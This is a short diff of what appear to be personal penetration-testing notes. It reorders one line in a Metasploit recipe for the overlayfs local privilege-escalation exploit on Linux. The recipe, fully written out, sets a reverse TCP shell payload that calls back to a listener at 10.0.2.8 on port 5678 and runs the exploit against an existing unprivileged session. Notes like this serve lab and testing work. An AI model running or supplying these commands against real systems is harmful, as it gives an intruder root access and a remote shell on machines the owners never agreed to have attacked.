@@ -48,9 +48,9 @@ to give to backgrounded session Y use: sessions -i Y -c 'command'
 PRIVILEGE ESCALATION OPTIONS
 1 from msfconsole, X is unprivileged session number
 	use exploit/linux/local/overlayfs_priv_esc
-	set payload linux/x86/shell/reverse_tcp #?default
 	set target 0
 	set session X
+	set payload linux/x86/shell/reverse_tcp #?default
 	set lhost 10.0.2.8
 	set lport 5678
 	run -j
